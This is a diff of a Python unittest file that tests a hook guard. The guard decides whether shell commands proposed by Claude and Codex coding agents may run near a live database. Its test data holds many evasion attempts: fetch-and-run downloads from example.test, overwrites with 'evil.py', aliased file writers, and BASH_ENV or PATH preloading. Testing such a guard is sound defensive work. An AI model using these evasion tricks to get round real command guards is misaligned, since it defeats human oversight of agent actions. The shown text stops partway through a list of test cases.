@@ -1,3 +1,10 @@
+if __package__:
+    from . import test_environment
+else:
+    import test_environment
+
+from contextlib import redirect_stdout
+import io
 import json
 import os
 from pathlib import Path
@@ -13,6 +20,8 @@ import engine
 import statev2_guard as guard
 import code_mode_fixture
 import isolated_source_cases
+import claude
+import codex
 
 LIVE = "/Users/x/.robob/userdata/statev2.sqlite"
 READ = "live-database-read"
@@ -22,7 +31,7 @@ UNRESOLVED = "live-database-script-unresolved"
 
 class GuardTests(unittest.TestCase):
     def setUp(self):
-        clean = patch.dict(os.environ, isolated_source_cases.fixture_environment())
+        clean = isolated_source_cases.fixture_environment_patch()
         clean.start()
         self.addCleanup(clean.stop)
         self.temp = tempfile.TemporaryDirectory()
@@ -51,6 +60,305 @@ class GuardTests(unittest.TestCase):
         path.parent.mkdir(parents=True, exist_ok=True)
         path.write_text(source)
         return path
+
+    def heredoc(self, target, body):
+        return 'cat > ' + target + " <<'GUARD_BODY'\n" + body.rstrip() + '\nGUARD_BODY\n'
+
+    def reporter_body(self, name):
+        return (Path(__file__).with_name('fixtures') / 'heredoc-rerun' / name).read_text()
+
+    def adapters(self, command, expected=None):
+        for harness, adapter, tool, field in [('claude', claude, 'Bash', 'command'), ('codex', codex, 'exec_command', 'cmd')]:
+            event = {'hook_event_name': 'PreToolUse', 'cwd': str(self.root), 'tool_name': tool,
+                     'tool_input': {field: command}}
+            with self.subTest(harness=harness), patch.object(engine, '_log'), patch.object(engine, '_tool_log'), \
+                    patch.object(engine, '_offbox_mode', return_value='off'), \
+                    patch.object(engine, '_native', return_value=(None, None, None)), \
+                    patch.dict(os.environ, {name: '' for name in (engine.COMMAND_IDENTITY_ENV, 'AGENT_GUARD_APPROVED', 'HARNESS_COORD_APPROVED')}):
+                result = engine.decide(event, harness)
+                self.assertEqual(result['decision'], 'deny' if expected else 'allow', result)
+                if expected:
+                    self.assertEqual(result['context']['rule'], expected)
+                with patch.object(sys, 'stdin', io.StringIO(json.dumps(event))), redirect_stdout(io.StringIO()) as output:
+                    adapter.main()
+                if expected:
+                    self.assertEqual(json.loads(output.getvalue())['hookSpecificOutput']['permissionDecision'], 'deny')
+                else:
+                    self.assertEqual(output.getvalue(), '')
+
+    def test_same_call_unproved_python_operations(self):
+        rows = {
+            'download': "import urllib.request\nurllib.request.urlretrieve('https://example.test/replacement.py', __file__)",
+            'download alias': "from urllib.request import urlretrieve as fetch\nfetch('https://example.test/replacement.py', __file__)",
+            'archive': "import zipfile\nzipfile.ZipFile('payload.zip').extractall('.')",
+            'archive alias': "from zipfile import ZipFile as Archive\nArchive('payload.zip').extractall('.')",
+            'local import': 'import updater',
+            'local call': 'import updater\nupdater.update()',
+            'local member': 'from updater import update\nupdate()',
+            'unknown method': "import pathlib\npathlib.Path('x.py').touch()",
+            'callback': "import json\nfrom urllib.request import urlretrieve\njson.dumps(object, default=urlretrieve)",
+        }
+        self.write('updater.py', 'print(1)')
+        for label, body in rows.items():
+            for interpreter in ['python3', 'python3 -I']:
+                command = self.heredoc('tmp/x.py', body) + interpreter + ' tmp/x.py\n' + interpreter + ' tmp/x.py'
+                with self.subTest(label=label, interpreter=interpreter):
+                    self.assertEqual(self.classify(command), UNRESOLVED)
+                    self.adapters(command, UNRESOLVED)
+                    reason = guard.refusal_reason(*guard.classify_detail(command, str(self.root)), str(self.root))
+                    self.assertIn('intervening command', reason)
+                    self.assertNotIn('literal absolute', reason)
+
+    def test_same_call_unittest_main_module_selection(self):
+        # Source bytes only: neither the proposed runner nor this import-time
+        # writer is executed by the classifier/adapter checks.
+        self.write('updater.py', self.reporter_body('unittest-updater.py'))
+        target = str(self.root / 'x.py')
+        imports = [
+            ('import unittest', 'unittest.main'),
+            ('import unittest as tests', 'tests.main'),
+            ('from unittest import main as run', 'run'),
+        ]
+        arguments = [
+            ('', None),
+            ("'__main__'", None),
+            ("'updater'", UNRESOLVED),
+            ("module='updater'", UNRESOLVED),
+            ("module='__main__'", UNRESOLVED),
+            ('None', UNRESOLVED),
+            ('__name__', UNRESOLVED),
+            ("*['updater']", UNRESOLVED),
+            ("**{'module': 'updater'}", UNRESOLVED),
+            ("'__main__', 'updater'", UNRESOLVED),
+            ("'__main__', argv=['x.py', 'discover']", UNRESOLVED),
+            ("'__main__', testLoader=unittest.defaultTestLoader", UNRESOLVED),
+        ]
+        for source_import, function in imports:
+            for args, expected in arguments:
+                body = source_import + '\n' + function + '(' + args + ')'
+                for interpreter in ['python3', 'python3 -I']:
+                    for setup, script in [('', target), ('d=$(mktemp -d)\n', '"$d/x.py"')]:
+                        command = setup + self.heredoc(script, body) + interpreter + ' ' + script + '\n' + interpreter + ' ' + script
+                        with self.subTest(function=function, args=args, interpreter=interpreter, script=script):
+                            self.assertEqual(self.classify(command), expected)
+                            self.adapters(command, expected)
+            for options in ['discover', 'updater', '-v']:
+                body = source_import + '\n' + function + '()'
+                run = 'python3 -I ' + target
+                command = self.heredoc(target, body) + run + ' ' + options + '\n' + run
+                with self.subTest(function=function, options=options):
+                    self.assertEqual(self.classify(command), UNRESOLVED)
+                    self.adapters(command, UNRESOLVED)
+
+    def test_same_call_copy_replaces_opaque_source(self):
+        seed = self.write('source/readback.ndjson', 'print(2)')
+        for write_root in ['$d', '${d}']:
+            for copy_root in ['$d', '${d}']:
+                for destination in ['', 'readback.ndjson', './readback.ndjson', 'sibling.ndjson']:
+                    for order in ['before', 'after']:
+                        target = '"' + write_root + '/readback.ndjson"'
+                        write = self.heredoc(target, 'print(1)')
+                        copy = f'cp {seed} "{copy_root}/{destination}"\n'
+                        command = 'd=$(mktemp -d)\n' + (copy + write if order == 'before' else write + copy) + 'python3 -I ' + target
+                        expected = UNRESOLVED
+                        with self.subTest(write_root=write_root, copy_root=copy_root, destination=destination, order=order):
+                            self.assertEqual(self.classify(command), expected)
+                            self.adapters(command, expected)
+                            if destination in {'', 'readback.ndjson'}:
+                                rule, cause = guard.classify_detail(command, str(self.root))
+                                self.assertIn('unchecked copy', cause)
+                                self.assertNotIn('literal absolute', guard.refusal_reason(rule, cause, str(self.root)))
+
+    def test_same_call_checked_test_runners(self):
+        target = str(self.root / 'skip.test.mjs')
+        body = "import test from 'node:test'; test.skip('skip output', () => {});"
+        run = f'bun test {target} 2>&1 | tail -2; node --test {target} 2>&1 | tail -1'
+        command = self.heredoc(target, body) + run
+        self.assertEqual(guard.classify_detail(command, str(self.root)), (None, None))
+        self.adapters(command)
+        for body in [body.replace("'node:test'", "'./unchecked.mjs'"), body + '\nimport "./unchecked.mjs";',
+                     body.replace('() => {}', '() => { process.exit(1); }'), body + '\nprocess.dlopen({});']:
+            command = self.heredoc(target, body) + run
+            with self.subTest(body=body):
+                self.assertEqual(self.classify(command), UNRESOLVED)
+                self.adapters(command, UNRESOLVED)
+        command = self.heredoc(target, "import fs from 'node:fs'; fs.readFileSync(" + repr(LIVE) + ");") + run
+        self.assertEqual(self.classify(command), SCRIPT)
+        self.adapters(command, SCRIPT)
+        for runner in [f'node --test --import tmp/hook.mjs {target}', f'bun test --preload tmp/hook.mjs {target}']:
+            command = self.heredoc(target, "import test from 'node:test'; test.skip('skip output', () => {});") + runner + '\nnode --test ' + target
+            self.assertEqual(self.classify(command), UNRESOLVED)
+            self.adapters(command, UNRESOLVED)
+
+    def test_same_call_two_test_files(self):
+        command = self.heredoc('test_one.py', 'import unittest\nclass T(unittest.TestCase):\n def test_one(self): self.assertTrue(True)')
+        command += self.heredoc('test_two.py', 'import unittest\nclass U(unittest.TestCase):\n def test_two(self): self.assertTrue(True)')
+        command += 'python3 -m unittest discover'
+        self.assertEqual(guard.classify_detail(command, str(self.root)), (None, None))
+        self.adapters(command)
+
+    def test_same_call_watchers47(self):
+        command = self.reporter_body('watchers47.sh')
+        self.assertEqual(guard.classify_detail(command, str(self.root)), (None, None))
+        self.adapters(command)
+
+    def test_same_call_literal_reporters(self):
+        script = self.root / 'tmp/replay.py'
+        replay = self.heredoc(str(script), self.reporter_body('replay.py'))
+        run = f'python3 -I {script} {self.root}/tmp/before {self.root}/tmp/result'
+        batches = {
+            'A single': replay + run + ' > tmp/before.json',
+            'checked rerun': self.heredoc(str(script), 'import json\nprint(json.dumps(dict(count=1)))') + run + '\n' + run,
+            'A sibling': replay + 'git show HEAD:src/tool.py > tmp/sibling.py\n' + run,
+            'A copy to sibling': replay + f'cp {script} tmp/sibling.py\n' + run,
+            'A reconstructed': 'mkdir tmp/before\ngit show HEAD:src/tool.py > tmp/before/tool.py\n' + replay + 'git show HEAD:src/reader.py > tmp/sibling.py\n' + run + ' > tmp/before.json',
+            'D2 single': self.heredoc(str(self.root / 'tmp/report.py'), self.reporter_body('report.py')) + 'unset BUN_INSPECT\npython3 -I tmp/report.py tmp/credential.json',
+        }
+        for label, command in batches.items():
+            with self.subTest(label=label):
+                self.assertEqual(guard.classify_detail(command, str(self.root)), (None, None))
+        # DB-safe is not a source-preservation proof for unchecked imports.
+        self.assertEqual(self.classify(replay + run + '\n' + run), UNRESOLVED)
+        for interpreter in ['bun', 'node']:
+            prefix = self.heredoc('tmp/readback.ts', self.reporter_body('readback.ts'))
+            run = interpreter + ' tmp/readback.ts tmp/some.ndjson'
+            self.assertEqual(guard.classify_detail(prefix + run + '\n' + run, str(self.root)), (None, None))
+
+    def test_same_call_fresh_reporters(self):
+        for variable in ['$d', '${d}']:
+            for separator in ['\n', '; ']:
+                for setup in ['', 'set -euo pipefail\n']:
+                    for binary, filename in [('bun', 'readback.ts'), ('node', 'readback.ts'), ('python3', 'report.py'), ('python3 -I', 'report.py')]:
+                        target = '"' + variable + '/' + filename + '"'
+                        body = self.reporter_body(filename)
+                        prefix = setup + 'd=$(mktemp -d)' + separator + 'cp /fixtures/some.ndjson "' + variable + '/"' + separator
+                        run = binary + ' ' + target + ' tmp/credential.json'
+                        command = prefix + self.heredoc(target, body) + run + separator + run
+                        with self.subTest(variable=variable, separator=separator, setup=setup, binary=binary):
+                            self.assertEqual(guard.classify_detail(command, str(self.root)), (None, None))
+        # Quoting is required: IFS and glob expansion are not proved by mktemp.
+        command = 'd=$(mktemp -d); ' + self.heredoc('"$d/report.py"', self.reporter_body('report.py')) + 'python3 -I $d/report.py'
+        self.assertEqual(self.classify(command), UNRESOLVED)
+
+    def test_same_call_unittest_reporters(self):
+        for relative, filename in [('integrations/robob-watch/checks/money-cases', 'test_order_charges.py'), ('integrations/memory-system/tests', 'test_state_lineage_logging.py')]:
+            for absolute_write in [False, True]:
+                target = relative + '/' + filename
+                if absolute_write:
+                    target = str(self.root / target)
+                prefix = self.heredoc(target, self.reporter_body(filename))
+                runners = [
+                    f'python3 -m unittest discover -s {relative}',
+                    f'python3 -I -m unittest discover -s {relative} -p \'test_*.py\' -t . -v',
+                    f'cd {relative} && python3 -m unittest discover',
+                    f'python3 {self.root / relative / filename}',
+                ]
+                if filename == 'test_state_lineage_logging.py':
+                    runners.append('cd integrations/memory-system && python3 -m unittest discover -s tests')
+                for runner in runners:
+                    for preparation in ['', 'unset BUN_INSPECT\n']:
+                        command = prefix + preparation + runner
+                        with self.subTest(target=target, runner=runner, preparation=preparation):
+                            self.assertEqual(guard.classify_detail(command, str(self.root)), (None, None))
+        simple = 'import tempfile, unittest\nclass Fixture(unittest.TestCase):\n def test_fixture(self):\n  with tempfile.TemporaryDirectory() as root:\n   self.assertTrue(root)\n'
+        prefix = self.heredoc('tmp/test_fixture.py', simple)
+        run = 'python3 -m unittest discover -s tmp'
+        self.assertEqual(guard.classify_detail(prefix + run + '\n' + run, str(self.root)), (None, None))
+
+    def test_same_call_offbox_reporter(self):
+        relative = 'integrations/memory-system/tests/benchmark_recall_storage.py'
+        for destination in [relative, str(self.root / relative)]:
+            for target in [relative, str(self.root / relative)]:
+                for binary in ['python3', 'python3 -I']:
+                    for wrapper in ['', 'offbox run -- ', 'offbox run --bg --size xlarge -- ']:
+                        prefix = self.heredoc(destination, self.reporter_body('benchmark_recall_storage.py'))
+                        command = prefix + 'git show HEAD:src/storage.py > tmp/baseline.py\n' + wrapper + binary + ' ' + target
+                        with self.subTest(destination=destination, target=target, binary=binary, wrapper=wrapper):
+                            self.assertEqual(guard.classify_detail(command, str(self.root)), (None, None))
+        body = 'import os, sqlite3, tempfile\nwith tempfile.TemporaryDirectory() as tmp:\n sqlite3.connect(os.path.join(tmp, "bench.db"))\n'
+        self.assertEqual(guard.classify_detail(self.heredoc(relative, body) + 'offbox run -- python3 ' + relative, str(self.root)), (None, None))
+
+    def test_same_call_still_refuses_rewrites(self):
+        target = str(self.root / 'tmp/replay.py')
+        prefix = self.heredoc(target, 'print(1)')
+        changes = [
+            f'echo {shlex.quote("import sqlite3; sqlite3.connect(" + repr(LIVE) + ")")} >> {target}',
+            f'cp /other/evil.py {target}', f'sed -i s/1/2/ {target}',
+            f'curl -o {target} https://example.test/x', f'curl https://example.test/x > {target}',
+            f'git show HEAD:other.py > {target}', f'cat /other/evil.py >> {target}',
+            'python3 -I tmp/other.py', 'python3 -m some_local_module',
+            'offbox run -- python3 -I tmp/other.py', 'offbox run -- unknown-program',
+        ]
+        for change in changes:
+            with self.subTest(change=change):
+                self.assertIsNotNone(self.classify(prefix + change + '\npython3 -I ' + target))
+        for body in ['from pathlib import Path\nPath(__file__).write_text("print(2)")', 'open(__file__, "w").write("print(2)")', 'import sys\nopen(sys.argv[0], "w").write("print(2)")']:
+            command = self.heredoc(target, body) + f'python3 -I {target}\npython3 -I {target}'
+            with self.subTest(body=body):
+                self.assertEqual(self.classify(command), UNRESOLVED)
+        for body in ['writer = open\nwriter(__file__, "w").write("print(2)")', 'from io import open as writer\nwriter(__file__, "w").write("print(2)")', 'from pathlib import Path\nPath(sys.argv[1]).write_text("print(2)")']:
+            command = self.heredoc(target, body) + f'python3 -I {target}\npython3 -I {target}'
+            self.assertEqual(self.classify(command), UNRESOLVED)
+        relative = 'integrations/memory-system/tests/test_state_lineage_logging.py'
+        for change in [f'sed -i s/1/2/ {relative}', f'cat /other/evil.py >> {relative}', 'python3 -m some_local_module']:
+            command = self.heredoc(relative, 'print(1)') + change + '\npython3 -m unittest discover -s integrations/memory-system/tests'
+            self.assertEqual(self.classify(command), UNRESOLVED)
+
+    def test_same_call_fresh_fail_closed(self):
+        for setup in ['d=$(mktemp -d)', '[ -n "$x" ] && d=$(mktemp -d)', 'd=$(mktemp -d); d=$OTHER']:
+            for binary, filename in [('bun', 'readback.ts'), ('python3 -I', 'report.py')]:
+                run = binary + ' "$d/' + filename + '"'
+                with self.subTest(setup=setup, binary=binary):
+                    self.assertEqual(self.classify(setup + '; ' + run), UNRESOLVED)
+                    self.assertEqual(self.classify(setup + '; cp /abs/unchecked.ts "$d/' + filename + '"; ' + run), UNRESOLVED)
+                    if setup != 'd=$(mktemp -d)':
+                        self.assertEqual(self.classify(setup + '; ' + self.heredoc('"$d/' + filename + '"', 'print(1)') + run), UNRESOLVED)
+        for filename, run in [('report.py', 'python3 -I'), ('readback.ts', 'bun')]:
+            command = 'd=$(mktemp -d); ' + self.heredoc('"$d/' + filename + '"', 'import sqlite3; sqlite3.connect(' + repr(LIVE) + ')') + run + ' "$d/' + filename + '"'
+            self.assertEqual(self.classify(command), SCRIPT)
+
+    def test_same_call_review_writer_forms(self):
+        bodies = {
+            'import alias': "from os import rename as f\nf('unchecked.py', 'tmp/x.py')",
+            'dynamic callable': "import operator\nf=operator.methodcaller('write_text', 'print(2)')\nf(target)",
+            'conditional binding': "from pathlib import Path\np=Path('tmp/x.py')\nif False:\n p=Path('tmp/data')\np.write_text('print(2)')",
+            'annotated binding': "from pathlib import Path\np=Path('tmp/data')\np: object=Path('tmp/x.py')\np.write_text('print(2)')",
+            'parameter shadow': "from pathlib import Path\np=Path('tmp/data')\ndef edit(p):\n p.write_text('print(2)')\nedit(Path('tmp/x.py'))",
+            'annotated alias': "writer: object = open\nwriter(__file__, 'w').write('print(2)')",
+            'walrus alias': "(writer := open)(__file__, 'w').write('print(2)')",
+            'unpacked alias': "writer, = [open]\nwriter(__file__, 'w').write('print(2)')",
+            'chained alias': "writer = other = open\nwriter(__file__, 'w').write('print(2)')",
+            'dunder alias': "from io import open as writer\nwriter.__call__(__file__, 'w').write('print(2)')",
+        }
+        for label, body in bodies.items():
+            command = self.heredoc('tmp/x.py', body) + 'python3 -I tmp/x.py\npython3 -I tmp/x.py'
+            with self.subTest(label=label):
+                self.assertEqual(self.classify(command), UNRESOLVED)
+        bodies = [
+            "const trim=process.getBuiltinModule; const split=trim('fs').copyFileSync; split(process.argv[2],process.argv[1]);",
+            "readFileSync = process.dlopen; readFileSync(process.argv[2]);",
+        ]
+        for body in bodies:
+            command = 'd=$(mktemp -d); ' + self.heredoc('"$d/x.js"', body) + 'node "$d/x.js" unchecked.js\nnode "$d/x.js"'
+            self.assertEqual(self.classify(command), UNRESOLVED)
+        seed = self.write('tmp/seed.ndjson', 'print(2)')
+        seed.chmod(0o444)
+        for variable in ['$d', '${d}']:
+            for name in ['seed.ndjson', './seed.ndjson', 'nested/../seed.ndjson', 'sibling.py']:
+                target = '"' + variable + '/' + name + '"'
+                prefix = 'd=$(mktemp -d); cp ' + str(seed) + ' "' + variable + '/"; '
+                command = prefix + self.heredoc(target, 'print(1)') + 'python3 -I ' + target
+                with self.subTest(variable=variable, name=name):
+                    self.assertEqual(self.classify(command), None if name == 'sibling.py' else UNRESOLVED)
+        command = 'd=$(mktemp -d /Users/x/.robob/userdata/scratch.XXXXXX); ' + self.heredoc('"$d/report.py"', 'print(1)') + 'python3 -I "$d/report.py"'
+        self.assertEqual(self.classify(command), UNRESOLVED)
+        for relative, runner in [
+            ('integrations/robob-watch/checks/money-cases/test_order_charges.py', 'python3 -m unittest discover -s integrations/robob-watch/checks/money-cases'),
+            ('integrations/memory-system/tests/test_state_lineage_logging.py', 'python3 -m unittest discover -s integrations/memory-system/tests'),
+            ('integrations/memory-system/tests/benchmark_recall_storage.py', 'offbox run -- python3 integrations/memory-system/tests/benchmark_recall_storage.py'),
+        ]:
+            command = self.heredoc(relative, 'import sqlite3; sqlite3.connect(' + repr(LIVE) + ')') + runner
+            self.assertEqual(self.classify(command), SCRIPT)
 
     def classify(self, command):
         return guard.classify(command, str(self.root))
@@ -1257,6 +1565,358 @@ class GuardTests(unittest.TestCase):
             with self.subTest(case='script-assigns-tmpdir', command=command):
                 self.assertEqual(self.classify(command), SCRIPT)
 
+    def repo_node_pin(self, init=None, select=None, wrapper=None):
+        """A temp HOME carrying a repo-node-pin chain shaped like the fork's."""
+        source = Path(__file__).resolve().parents[2] / 'local-helpers/libexec/repo-node-pin'
+        home = self.root / 'home'
+        helper = home / '.local/libexec/repo-node-pin'
+        (helper / 'pnpm-bin').mkdir(parents=True, exist_ok=True)
+        (helper / 'pnpm-bin/pnpm').write_text('#!/bin/sh\n')
+        (helper / 'bash-env.sh').write_text((source / 'bash-env.sh').read_text() if wrapper is None else wrapper)
+        (helper / 'init.sh').write_text((source / 'init.sh').read_text() if init is None else init)
+        (helper / 'select.py').write_text((source / 'select.py').read_text() if select is None else select)
+        (home / '.nvm/versions/node/v26.0.0/bin').mkdir(parents=True, exist_ok=True)
+        (home / '.nvm/versions/node/v26.0.0/bin/node').write_text('')
+        environment = {'HOME': str(home), 'BASH_ENV': str(helper / 'bash-env.sh'),
+                       'ROBOB_REPO_PREVIOUS_BASH_ENV': '', 'ROBOB_REPO_NODE_HELPER': '',
+                       'ROBOB_REPO_NODE_PYTHON': '', 'NVM_DIR': str(home / '.nvm'), '_repo_node_added_node': '', 'ZDOTDIR': ''}
+        return home, helper, environment
+
+    def write_plain_subpath_fixture(self):
+        backup = Path(__file__).resolve().parents[3] / 'integrations/memory-system/tests/test_backup_replica.sh'
+        self.write('tmp/fixture.sh', backup.read_text().replace('/.robob/userdata/statev2.sqlite', '/fixture-live/userdata/statev2.sqlite'))
+        return ('bash tmp/fixture.sh', '/bin/bash ' + str(self.root / 'tmp/fixture.sh'),
+                'offbox run --bg -- bash tmp/fixture.sh')
+
+    def test_inherited_repo_node_pin_bash_env_keeps_fixture_proof(self):
+        commands = self.write_plain_subpath_fixture()
+        home, helper, environment = self.repo_node_pin()
+        with patch.dict(os.environ, environment):
+            for command in commands:
+                with self.subTest(command=command):
+                    self.assertEqual(guard.classify_detail(command, str(self.root)), (None, None))
+            # The previous BASH_ENV may equal this one (init.sh's own guard).
+            with patch.dict(os.environ, {'ROBOB_REPO_PREVIOUS_BASH_ENV': environment['BASH_ENV'],
+                                         'ROBOB_REPO_NODE_HELPER': str(helper),
+                                         'ROBOB_REPO_NODE_PYTHON': '/opt/homebrew/bin/python3'}):
+                self.assertIsNone(self.classify(commands[0]))
+            self.assertIsNone(self.classify('bash -n tmp/fixture.sh'))
+            # Bindings the command sets are never inherited.
+            for prefix in ('BASH_ENV=/tmp/preload.sh ', 'BASH_ENV=' + environment['BASH_ENV'] + ' ',
+                           'ENV=/tmp/preload.sh ', 'export BASH_ENV=/tmp/preload.sh; ', 'env BASH_ENV=/tmp/preload.sh ',
+                           'PATH=/tmp/shadow:$PATH ', 'SHELLOPTS=xtrace ', 'HOME=/tmp/elsewhere ',
+                           'export HOME=/tmp/elsewhere; ', 'ROBOB_REPO_PREVIOUS_BASH_ENV=/tmp/preload.sh ',
+                           'ROBOB_REPO_NODE_HELPER=/tmp/helper ', 'ROBOB_REPO_NODE_PYTHON=/tmp/python ',
+                           'NVM_DIR=/tmp/nvm ', '_repo_node_added_node=/usr/bin ', 'unset HOME; ', 'env -u HOME '):
+                for wrapper in ('', 'offbox run -- ', 'offbox run --bg -- '):
+                    command = prefix + wrapper + 'bash tmp/fixture.sh'
+                    with self.subTest(command=command):
+                        self.assertEqual(self.classify(command), SCRIPT)
+            # A command that rewrites the chain before running the fixture.
+            for writer in ("cat > " + str(helper / 'init.sh') + " <<'SH'\n:\nSH\n",
+                           "cp /tmp/evil.sh ~/.local/libexec/repo-node-pin/init.sh; ",
+                           "cp /tmp/evil.py " + str(home / '.nvm/versions/node/v26.0.0/bin/cat') + "; "):
+                with self.subTest(writer=writer):
+                    self.assertEqual(self.classify(writer + 'bash tmp/fixture.sh'), SCRIPT)
+
+    def test_inherited_bash_env_refusals(self):
+        commands = self.write_plain_subpath_fixture()
+        live_read = 'cat "' + LIVE + '"\n'
+        refusals = []
+
+        def chain(label, *, init=None, select=None, wrapper=None, environment=None, setup=None):
+            refusals.append((label, dict(init=init, select=select, wrapper=wrapper), environment or {}, setup))
+
+        chain('init-live-read', init=live_read)
+        real_init = (Path(__file__).resolve().parents[2] / 'local-helpers/libexec/repo-node-pin/init.sh').read_text()
+        real_select = (Path(__file__).resolve().parents[2] / 'local-helpers/libexec/repo-node-pin/select.py').read_text()
+        reader = lambda home, helper: (home / 'reader.sh').write_text(live_read)
+        chain('init-runs-live-reader', init=real_init + 'bash "$HOME/reader.sh"\n', setup=reader)
+        chain('init-only-runs-live-reader', init='bash "$HOME/reader.sh"\n', setup=reader)
+        chain('init-runs-unresolved', init='bash "$UNRESOLVED"\n')
+        chain('init-redefines-mktemp', init='mktemp() { printf "%s\\n" "$HOME"; }\n')
+        chain('init-exports-mktemp', init=real_init + 'mktemp() { printf "%s\\n" "$HOME"; }; export -f mktemp\n')
+        chain('init-comment-drift', init=real_init + '# reviewed?\n')
+        chain('select-runs-live-reader', select='import os, subprocess\nsubprocess.run(["bash", os.environ["HOME"] + "/reader.sh"])\n', setup=reader)
+        chain('select-appends-reader', select=real_select + '\nimport os\nos.system("bash $HOME/reader.sh")\n', setup=reader)
+        chain('wrapper-whitespace-drift', wrapper=(Path(__file__).resolve().parents[2] / 'local-helpers/libexec/repo-node-pin/bash-env.sh').read_text() + '\n')
+        chain('init-split-live-read', init='cat "$HOME/.ro""bob/userdata/state""v2.sqlite"\n')
+        chain('select-live-read', select='open(' + repr(LIVE) + ').read()\n')
+        chain('init-sources-live-reader', init='. "$HOME/reader.sh"\n',
+              setup=lambda home, helper: (home / 'reader.sh').write_text(live_read))
+        chain('init-sources-clean-file', init='if true; then source "$HOME/clean.sh"; fi\n',
+              setup=lambda home, helper: (home / 'clean.sh').write_text(':\n'))
+        chain('init-sources-unresolved', init='. "$UNRESOLVED"\n')
+        chain('wrapper-sources-unresolved', wrapper='. "$UNRESOLVED"\n')
+        chain('wrapper-extra-source', wrapper=(Path(__file__).resolve().parents[2] / 'local-helpers/libexec/repo-node-pin/bash-env.sh').read_text() + '. "$HOME/x.sh"\n')
+        chain('wrapper-live-read', wrapper=live_read)
+        chain('previous-bash-env-live', environment={'ROBOB_REPO_PREVIOUS_BASH_ENV': '{home}/previous.sh'},
+              setup=lambda home, helper: (home / 'previous.sh').write_text(live_read))
+        chain('previous-bash-env-clean', environment={'ROBOB_REPO_PREVIOUS_BASH_ENV': '{home}/previous.sh'},
+              setup=lambda home, helper: (home / 'previous.sh').write_text(':\n'))
+        chain('bash-env-missing', setup=lambda home, helper: (helper / 'bash-env.sh').unlink())
+        chain('bash-env-directory', setup=lambda home, helper: ((helper / 'bash-env.sh').unlink(), (helper / 'bash-env.sh').mkdir()))
+        chain('init-missing', setup=lambda home, helper: (helper / 'init.sh').unlink())
+        chain('select-missing', setup=lambda home, helper: (helper / 'select.py').unlink())
+        if os.geteuid() != 0:
+            chain('bash-env-unreadable', setup=lambda home, helper: (helper / 'bash-env.sh').chmod(0))
+        chain('bash-env-elsewhere', environment={'BASH_ENV': '{home}/bash-env.sh'},
+              setup=lambda home, helper: (home / 'bash-env.sh').write_text((helper / 'bash-env.sh').read_text()))
+        chain('bash-env-unexpanded', environment={'BASH_ENV': '$HOME/.local/libexec/repo-node-pin/bash-env.sh'})
+        chain('bash-env-relative', environment={'BASH_ENV': 'home/.local/libexec/repo-node-pin/bash-env.sh'})
+        chain('node-helper-elsewhere', environment={'ROBOB_REPO_NODE_HELPER': '{home}'})
+        chain('node-python-elsewhere', environment={'ROBOB_REPO_NODE_PYTHON': '/tmp/python3'})
+        chain('nvm-shadows-cat', setup=lambda home, helper: (home / '.nvm/versions/node/v26.0.0/bin/cat').write_text(''))
+        chain('nvm-dir-shadows-mktemp', environment={'NVM_DIR': '{home}/other-nvm'},
+              setup=lambda home, helper: ((home / 'other-nvm/versions/node/v1.0.0/bin').mkdir(parents=True),
+                                          (home / 'other-nvm/versions/node/v1.0.0/bin/mktemp').write_text('')))
+        chain('pnpm-bin-shadows-rm', setup=lambda home, helper: (helper / 'pnpm-bin/rm').write_text(''))
+        chain('added-node-shadows-cp', environment={'_repo_node_added_node': '{home}/added'},
+              setup=lambda home, helper: ((home / 'added').mkdir(), (home / 'added/cp').write_text('')))
+        chain('managed-dir-shadows-cat', setup=lambda home, helper: ((home / '.local/share/quint-guard/bin').mkdir(parents=True),
+                                                                      (home / '.local/share/quint-guard/bin/cat').write_text('')))
+        chain('helper-module-hijack', setup=lambda home, helper: (helper / 'json.py').write_text(''))
+        chain('helper-package-hijack', setup=lambda home, helper: ((helper / 're').mkdir(), (helper / 're/__init__.py').write_text('')))
+        chain('python-startup', environment={'PYTHONPATH': '/tmp'})
+        chain('env-also-set', environment={'ENV': '/tmp/preload.sh'})
+        chain('zdotdir-set', environment={'ZDOTDIR': '/tmp'})
+        chain('exported-function', environment={'BASH_FUNC_cd%%': '() { :; }'})
+        for label, files, extra, setup in refusals:
+            shutil_root = self.root / 'home'
+            if shutil_root.exists():
+                for path in sorted(shutil_root.rglob('*'), reverse=True):
+                    path.chmod(0o700) if path.is_dir() else path.chmod(0o600)
+                    path.rmdir() if path.is_dir() and not path.is_symlink() else path.unlink()
+            home, helper, environment = self.repo_node_pin(**files)
+            if setup:
+                setup(home, helper)
+            environment.update({name: value.replace('{home}', str(home)) for name, value in extra.items()})
+            with patch.dict(os.environ, environment):
+                for command in commands:
+                    with self.subTest(case=label, command=command):
+                        self.assertEqual(self.classify(command), SCRIPT)
+
+    def test_inherited_bash_env_selector_inputs(self):
+        # select.py opens these before the script runs (repo files from the
+        # cwd up to the repo root, NVM aliases, pnpm package.json files).
+        commands = self.write_plain_subpath_fixture()
+        home, helper, environment = self.repo_node_pin()
+        marker = self.write('marker/.robob/userdata/statev2.sqlite', '{}')
+        plain = self.write('marker/plain.json', '{}')
+        nvm = home / '.nvm'
+        corepack = home / 'corepack'
+        environment['COREPACK_HOME'] = str(corepack)
+        made = []
+
+        def link(path, target):
+            path = Path(path)
+            path.parent.mkdir(parents=True, exist_ok=True)
+            path.symlink_to(target)
+            made.append(path)
+
+        def hard(path, target):
+            path = Path(path)
+            path.parent.mkdir(parents=True, exist_ok=True)
+            os.link(target, path)
+            made.append(path)
+
+        def fifo(path):
+            os.mkfifo(path)
+            made.append(Path(path))
+
+        def regular(path, text='{}'):
+            made.append(self.write(path, text) if not os.path.isabs(path) else Path(path))
+            if os.path.isabs(path):
+                Path(path).parent.mkdir(parents=True, exist_ok=True)
+                Path(path).write_text(text)
+
+        pnpm_root = home / 'pnpm-install/lib/node_modules/pnpm'
+        rows = [
+            ('cwd-package-json-live', lambda: link(self.root / 'package.json', marker), SCRIPT),
+            ('cwd-nvmrc-live', lambda: link(self.root / '.nvmrc', marker), SCRIPT),
+            ('cwd-node-version-live', lambda: link(self.root / '.node-version', marker), SCRIPT),
+            ('cwd-pnpm-lock-live', lambda: link(self.root / 'pnpm-lock.yaml', marker), SCRIPT),
+            ('script-dir-package-json-live', lambda: link(self.root / 'tmp/package.json', marker), None),
+            ('cwd-package-json-dangling-live', lambda: link(self.root / 'package.json', str(marker) + '-wal'), SCRIPT),
+            ('cwd-package-json-hard-link', lambda: hard(self.root / 'package.json', marker), SCRIPT),
+            ('cwd-package-json-fifo', lambda: fifo(self.root / 'package.json'), SCRIPT),
+            ('nvm-alias-live', lambda: link(nvm / 'alias/default', marker), SCRIPT),
